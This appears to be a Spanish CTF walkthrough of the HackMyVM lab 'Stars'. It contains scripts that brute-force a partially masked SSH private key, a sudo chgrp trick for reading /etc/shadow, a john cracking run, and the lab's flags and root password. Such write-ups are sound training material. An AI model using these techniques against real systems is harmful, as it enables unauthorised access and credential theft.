---
icon: flag
---

# Stars HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-22 03:16 EDT
Nmap scan report for 192.168.5.26
Host is up (0.00058s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e:f1:ed:84:cc:41:8c:7e:c6:92:a9:b4:29:57:bf:d1 (RSA)
|   256 9f:f3:93:db:72:ff:cd:4d:5f:09:3e:dc:13:36:49:23 (ECDSA)
|_  256 e7:a3:72:dd:d5:af:e2:b5:77:50:ab:3d:27:12:0f:ea (ED25519)
80/tcp open  http    Apache httpd 2.4.51 ((Debian))
|_http-server-header: Apache/2.4.51 (Debian)
|_http-title: Cours PHP & MySQL
MAC Address: 08:00:27:30:EE:02 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.18 seconds
```

Veremos que hay un puerto `80` en el que habra una pagina web alojada, si nosotros entramos dentro de dicha pagina veremos que esta como en construccion, por lo que no veremos nada interesante, vamos a realizar un poco de `fuzzing` a ver que encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.26/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 279]
/.html                (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
/sshnote.txt          (Status: 200) [Size: 117]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos un archivo interesante llamado `/sshnote.txt` por lo que vamos a entrar dentro de dicho archivo a ver que encontramos.

```
URL = http://<IP>/sshnote.txt
```

Info:

```
My RSA key is messed up, it looks like 3 capital letters have been replaced by stars.
Can you try to fix it?

sophie
```

Vemos que hemos encontrado un nombre de usuario el cual nos puede servir, pero a parte vemos en el mensaje que la clave `RSA` del usuario `sophie` le faltan tres letras mayusculas que son `*` por eso cuando la encontremos tendremos que montarnos un script en `python3` para poder descubrirlo.

Si inspeccionamos la pagina y nos vamos a la seccion de `Cookies` veremos esto interesante.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-05-22 092434.png" alt=""><figcaption></figcaption></figure>

Vemos que hay un codigo codificado en `base64` y si lo decodificamos veremos esto:

```shell
echo 'cG9pc29uZWRnaWZ0LnR4dA==' | base64 -d
```

Info:

```
poisonedgift.txt
```

Veremos lo que parece ser un archivo de una ruta web, por lo que vamos a probarlo.

## Escalate user sophie

```
URL = http://<IP>/poisonedgift.txt
```

Info:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAsruS5/Cd7clZ+SJJj0cvBPtTb9mfFvoO/FDtQ1i8ft3IZC9tHsKP
ut0abGtFGId9R0OB1ONB+iOMK5QNpoCXda3RDXJQ9oRCWjd2DxqRAyvdThhxq6wYJSATpa
l7M9UemrK/aDuZTAqLUSA9Zvpx474TiWXBMjdGqN2K/+SCf/DqIyknDLDRexe0Lc0IsNCV
/O39j4XJprHXMQZNaiokSuzV3VlXAYYBcTIK2Id/EMerpQdiNjMGvVIuBxfbF9/MGhEnR+
1fxxPTHZnKw5snlb47ynWtahCuZVVQr0b+c5z6MXVSJKP8LY0m8clQqUCwbPbCJnRJRCwh
TJY/xz0cu4H+Lbtx38iUv6NjiPXsvd/0FPjmNWrIwA3m4yYQL1dmSCX7JZAqYV5axI8box
Z4oHJP5dHADWdzic2XSqDSpIMxnDhlLh02ksCfNbkNkqbsiw/AO6IxnToPLH7jVjoYxnmA
y97klEGvt2UqIugfUV1p6j1sybTcM59ZUbo16i47AAAFiNnGZRvZxmUbAAAAB3NzaC1yc2
EAAAGBALK7kufwne3JWfkiSY9HLwT7U2/Znxb6DvxQ7UNYvH7dyGQvbR7Cj7rdGmxrRRiH
fUdDgdTjQfojjCuUDaaAl3Wt0Q1yUPaEQlo3dg8akQMr3U4YcausGCUgE6WpezPVHpqyv2
g7mUwKi1EgPWb6ceO+E4llwTI3Rqjdiv/kgn/w6iMpJwyw0XsXtC3NCLDQlfzt/Y+Fyaax
1zEGTWoqJErs1d1ZVwGGAXEyCtiHfxDHq6UHYjYzBr1SLgcX2xffzBoRJ0ftX8cT0x2Zys
ObJ5W+O8p1rWoQrmVVUK9G/nOc+jF1UiSj/C2NJvHJUKlAsGz2wiZ0SUQsIUyWP8c9HLuB
/i27cd/IlL+jY4j17L3f9BT45jVqyMAN5uMmEC9XZkgl+yWQKmFeWsSPG6MWeKByT+XRwA
1nc4nNl0qg0qSDMZw4ZS4dNpLAnzW5DZKm7IsPwDuiMZ06Dyx+41Y6GMZ5gMve5JRBr7dl
KiLoH1Fdaeo9bMm03DOfWVG6NeouOwAAAAMBAAEAAAGBAICL9cGJRhzCZ0qOhXdeDAw6Mi
1MyGX/HQ4Nqkd4p8FbA4hCr+mipzsPULTPhdd5gvnhLJyPgmFEdcjV5+drrwM9KxDPujlC
sHIwV2HPiqJMRxOm8wI0eP0ij97jATArRKKgkpeF3eBZ6Q9E78SDtavFhkmYfJYAOXq0NA
eNMuqPu+Xj8CjpdxBf4P/b6jc5HdbW2DoEUB7q40loLf+AJbAZnEthuPjoh1sBUdmfwhyw
btv3boRquJsrYt1JJ***qguwyDSLtXj4Wuxa7jZcLLSAuTHS+zWKwZA/8J1IpZAZhgkVXJ
fC8ZbG0M63VEQjuGXCuIY3cq1iQuXERhhbRuJ1XZT8Hki5YBaU/f5Wp7bId25Aps4ktljU
r67S9mwwppQ8dVmP6CsENgc3ivpWCDWC4PZojTgZ4qhWMpjCaUxe1Hi7GuvlRJNLL4A7Fx
kTV9nBcLlGfqzvVUPeEAZgXz4IxCx8KdTrDr/oXWw4hjqtuyRKveMjmKQ6HADFl7SMCQAA
AMBz8rqB0Mfb4U34LeA1kdZLFsGX3AZqahTDjEcZYAPI/A5Dt5iw0LcGRgrHuPccS5fA3E
GT2FceoMX2ccE5fEVydxcj2vcnPIQ01P6fxjVXpA7QDnJ2At2LLPcD9CuuSt/HCrp/Bmjv
IUFvjSgKl5nYGPfoeitIdFdM72liQ+0814iNzxNl5WuNeiJ+XAGuXqJT02gAxMRQPiJ67e
sMzJyVvM69B0kGkyAXTO9fcfq+X2JaCz3hId6Iwr68Mxe/L6MAAADBAOEpkHeU8xn5MHwG
79vpd6Cg7p1UqfDuvMOgvZe6eIOE3FIb1nWpCqjq9P0Myv8aCWYhwgKr3SNIWkZ1u+0NR9
43cZO7FWa4/DvI5gX6dlrcGy1BVoDuMWIWDw9bgXpQiGQSkQOQ3J/RPWH/xT5LQbrBVTK8
C8r4lrWDwWLMgk1Wbef6U0NBuY1+J4Hafsz2Psei3yFsjjA3djonb8JF+RnHRoO8TeJlj4
RjbkXTlhsGkdR77PNZmkZ2KVwn2VzsPwAAAMEAyzYixNTrJ4vPtjUluq7+O9qGwqpbl3i0
9ESSrC2NzbsA2afNjCWhfaLPpfNYR2gA1aQUgdRxNSM78P+plFhMUeGwTIsLsKEkbbtSqF
nUU/g3yNGFr4Die7AB0vZSHwWaQFMf+ZfXNwVRa0jmKfUc/itXgwxi3oqtWTJA7YKmXdrD
03EN/DboyflPcbmTJ4D6E6XqTeyfGamr0w5aelqqwTh/Mm+DuoHHiPMYThUMrG4iUvSRaz
ZgGQTtZoQRxi8FAAAADXNvcGhpZUBkZWJpYW4BAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

Veremos que aqui esta el `RSA` pero le faltan 3 letras mayusculas que son los `***`, por lo que vamos a montarnos un script de la siguiente forma:

> generateRSA.py

```python
import os
import itertools

# Ruta donde guardar las claves generadas
output_dir = "keys"
os.makedirs(output_dir, exist_ok=True)

# Clave original con los asteriscos
original_key = """-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAsruS5/Cd7clZ+SJJj0cvBPtTb9mfFvoO/FDtQ1i8ft3IZC9tHsKP
ut0abGtFGId9R0OB1ONB+iOMK5QNpoCXda3RDXJQ9oRCWjd2DxqRAyvdThhxq6wYJSATpa
l7M9UemrK/aDuZTAqLUSA9Zvpx474TiWXBMjdGqN2K/+SCf/DqIyknDLDRexe0Lc0IsNCV
/O39j4XJprHXMQZNaiokSuzV3VlXAYYBcTIK2Id/EMerpQdiNjMGvVIuBxfbF9/MGhEnR+
1fxxPTHZnKw5snlb47ynWtahCuZVVQr0b+c5z6MXVSJKP8LY0m8clQqUCwbPbCJnRJRCwh
TJY/xz0cu4H+Lbtx38iUv6NjiPXsvd/0FPjmNWrIwA3m4yYQL1dmSCX7JZAqYV5axI8box
Z4oHJP5dHADWdzic2XSqDSpIMxnDhlLh02ksCfNbkNkqbsiw/AO6IxnToPLH7jVjoYxnmA
y97klEGvt2UqIugfUV1p6j1sybTcM59ZUbo16i47AAAFiNnGZRvZxmUbAAAAB3NzaC1yc2
EAAAGBALK7kufwne3JWfkiSY9HLwT7U2/Znxb6DvxQ7UNYvH7dyGQvbR7Cj7rdGmxrRRiH
fUdDgdTjQfojjCuUDaaAl3Wt0Q1yUPaEQlo3dg8akQMr3U4YcausGCUgE6WpezPVHpqyv2
g7mUwKi1EgPWb6ceO+E4llwTI3Rqjdiv/kgn/w6iMpJwyw0XsXtC3NCLDQlfzt/Y+Fyaax
1zEGTWoqJErs1d1ZVwGGAXEyCtiHfxDHq6UHYjYzBr1SLgcX2xffzBoRJ0ftX8cT0x2Zys
ObJ5W+O8p1rWoQrmVVUK9G/nOc+jF1UiSj/C2NJvHJUKlAsGz2wiZ0SUQsIUyWP8c9HLuB
/i27cd/IlL+jY4j17L3f9BT45jVqyMAN5uMmEC9XZkgl+yWQKmFeWsSPG6MWeKByT+XRwA
1nc4nNl0qg0qSDMZw4ZS4dNpLAnzW5DZKm7IsPwDuiMZ06Dyx+41Y6GMZ5gMve5JRBr7dl
KiLoH1Fdaeo9bMm03DOfWVG6NeouOwAAAAMBAAEAAAGBAICL9cGJRhzCZ0qOhXdeDAw6Mi
1MyGX/HQ4Nqkd4p8FbA4hCr+mipzsPULTPhdd5gvnhLJyPgmFEdcjV5+drrwM9KxDPujlC
sHIwV2HPiqJMRxOm8wI0eP0ij97jATArRKKgkpeF3eBZ6Q9E78SDtavFhkmYfJYAOXq0NA
eNMuqPu+Xj8CjpdxBf4P/b6jc5HdbW2DoEUB7q40loLf+AJbAZnEthuPjoh1sBUdmfwhyw
btv3boRquJsrYt1JJ***qguwyDSLtXj4Wuxa7jZcLLSAuTHS+zWKwZA/8J1IpZAZhgkVXJ
fC8ZbG0M63VEQjuGXCuIY3cq1iQuXERhhbRuJ1XZT8Hki5YBaU/f5Wp7bId25Aps4ktljU
r67S9mwwppQ8dVmP6CsENgc3ivpWCDWC4PZojTgZ4qhWMpjCaUxe1Hi7GuvlRJNLL4A7Fx
kTV9nBcLlGfqzvVUPeEAZgXz4IxCx8KdTrDr/oXWw4hjqtuyRKveMjmKQ6HADFl7SMCQAA
AMBz8rqB0Mfb4U34LeA1kdZLFsGX3AZqahTDjEcZYAPI/A5Dt5iw0LcGRgrHuPccS5fA3E
GT2FceoMX2ccE5fEVydxcj2vcnPIQ01P6fxjVXpA7QDnJ2At2LLPcD9CuuSt/HCrp/Bmjv
IUFvjSgKl5nYGPfoeitIdFdM72liQ+0814iNzxNl5WuNeiJ+XAGuXqJT02gAxMRQPiJ67e
sMzJyVvM69B0kGkyAXTO9fcfq+X2JaCz3hId6Iwr68Mxe/L6MAAADBAOEpkHeU8xn5MHwG
79vpd6Cg7p1UqfDuvMOgvZe6eIOE3FIb1nWpCqjq9P0Myv8aCWYhwgKr3SNIWkZ1u+0NR9
43cZO7FWa4/DvI5gX6dlrcGy1BVoDuMWIWDw9bgXpQiGQSkQOQ3J/RPWH/xT5LQbrBVTK8
C8r4lrWDwWLMgk1Wbef6U0NBuY1+J4Hafsz2Psei3yFsjjA3djonb8JF+RnHRoO8TeJlj4
RjbkXTlhsGkdR77PNZmkZ2KVwn2VzsPwAAAMEAyzYixNTrJ4vPtjUluq7+O9qGwqpbl3i0
9ESSrC2NzbsA2afNjCWhfaLPpfNYR2gA1aQUgdRxNSM78P+plFhMUeGwTIsLsKEkbbtSqF
nUU/g3yNGFr4Die7AB0vZSHwWaQFMf+ZfXNwVRa0jmKfUc/itXgwxi3oqtWTJA7YKmXdrD
03EN/DboyflPcbmTJ4D6E6XqTeyfGamr0w5aelqqwTh/Mm+DuoHHiPMYThUMrG4iUvSRaz
ZgGQTtZoQRxi8FAAAADXNvcGhpZUBkZWJpYW4BAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
"""

# Solo necesitas editar para ubicar los ***
def generate_keys():
    count = 0
    for combo in itertools.product("ABCDEFGHIJKLMNOPQRSTUVWXYZ", repeat=3):
        replacement = ''.join(combo)
        key_data = original_key.replace("***", replacement)
        filename = os.path.join(output_dir, f"key_{replacement}.key")
        with open(filename, "w") as f:
            f.write(key_data)
        count += 1
        if count % 1000 == 0:
            print(f"[+] Generadas {count} claves...")
    print(f"[✔] Finalizado. Total de claves: {count}")

if __name__ == "__main__":
    generate_keys()
```

```shell
chmod +x generateRSA.py
mkdir keys
python3 generateRSA.py
```

Info:

```
[+] Generadas 1000 claves...
[+] Generadas 2000 claves...
[+] Generadas 3000 claves...
[+] Generadas 4000 claves...
[+] Generadas 5000 claves...
[+] Generadas 6000 claves...
[+] Generadas 7000 claves...
[+] Generadas 8000 claves...
[+] Generadas 9000 claves...
[+] Generadas 10000 claves...
[+] Generadas 11000 claves...
[+] Generadas 12000 claves...
[+] Generadas 13000 claves...
[+] Generadas 14000 claves...
[+] Generadas 15000 claves...
[+] Generadas 16000 claves...
[+] Generadas 17000 claves...
[✔] Finalizado. Total de claves: 17576
```

> bruteRSA.py

```bash
#!/bin/bash

IP="<IP_DEL_OBJETIVO>"
USER="sophie"
KEY_DIR="./keys"

for key in "$KEY_DIR"/*.key; do
    echo "Probando clave: $key"
    ssh -i "$key" -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$USER@$IP" exit
    if [ $? -eq 0 ]; then
        echo "[+] Clave válida encontrada: $key"
        exit 0
    else
        echo "[-] Clave incorrecta o error"
    fi
done
```

```shell
chmod +x bruteRSA.sh
chmod 600 keys/*
bash bruteRSA.sh
```

Info:

```
Probando clave: ./keys/key_BOM.key
[+] Clave válida encontrada: ./keys/key_BOM.key
```

Veremos que la clave correcta es la de las letras `BOM` por lo que haremos lo siguiente:

```shell
ssh -i ./keys/key_BOM.key sophie@<IP>
```

Info:

```
Linux debian 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu May 22 09:49:01 2025 from 192.168.5.4
sophie@debian:~$ whoami
sophie
```

Veremos que estaremos dentro por lo que leeremos la `flag` del usuario.

> user.txt

```
a99ac9055a3e60a8166cdfd746511852
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for sophie on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sophie may run the following commands on debian:
    (ALL : ALL) NOPASSWD: /usr/bin/chgrp
```

Vemos que podemos ejecutar el binario `chgrp` como el usuario `root` por lo que haremos lo siguiente:

Vamos a cambiar el grupo del archivo `shadow` por el de nuestro nombre con otro archivo que hayamos creado.

```shell
touch /tmp/test
sudo chgrp --reference=/tmp/test /etc/shadow
cat /etc/shadow
```

Info:

```
root:$1$root$dZ6JC474uVpAeG8g0oh/7.:18917:0:99999:7:::
daemon:*:18916:0:99999:7:::
bin:*:18916:0:99999:7:::
sys:*:18916:0:99999:7:::
sync:*:18916:0:99999:7:::
games:*:18916:0:99999:7:::
man:*:18916:0:99999:7:::
lp:*:18916:0:99999:7:::
mail:*:18916:0:99999:7:::
news:*:18916:0:99999:7:::
uucp:*:18916:0:99999:7:::
proxy:*:18916:0:99999:7:::
www-data:*:18916:0:99999:7:::
backup:*:18916:0:99999:7:::
list:*:18916:0:99999:7:::
irc:*:18916:0:99999:7:::
gnats:*:18916:0:99999:7:::
nobody:*:18916:0:99999:7:::
_apt:*:18916:0:99999:7:::
systemd-timesync:*:18916:0:99999:7:::
systemd-network:*:18916:0:99999:7:::
systemd-resolve:*:18916:0:99999:7:::
messagebus:*:18916:0:99999:7:::
sshd:*:18916:0:99999:7:::
systemd-coredump:!*:18916::::::
mysql:!:18917:0:99999:7:::
sophie:$y$j9T$mD6gcz0.6rC4ZwGpDem3o0$HzDd6YXLy3Dsht17WVVX7v7ReGcJ9PXhG/B3bx4Nz/C:18917:0:99999:7:::
```

Veremos que ha funcionado por lo que vamos a intentar `crackear` la contraseña de `root` a ver si funciona.

> hash.root

```
root:$1$root$dZ6JC474uVpAeG8g0oh/7.:18917:0:99999:7:::
```

```shell
john --format=crypt --wordlist=<WORDLIST> hash.root
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 2 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
barbarita        (root)     
1g 0:00:00:00 DONE (2025-05-22 03:56) 1.449g/s 41321p/s 41321c/s 41321C/s chiquititas..281086
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos que ha funcionado por lo que escalaremos a `root` con dicha contraseña.

```shell
su root
```

Metemos como contraseña `barbarita`...

```
root@debian:/home/sophie# whoami
root
```

Y veremos que seremos el usuario `root` por lo que vamos a leer la `flag` de `root`.

> root.txt

```
bf3b0ba0d7ebf3a1bf6f2c452510aea2
```
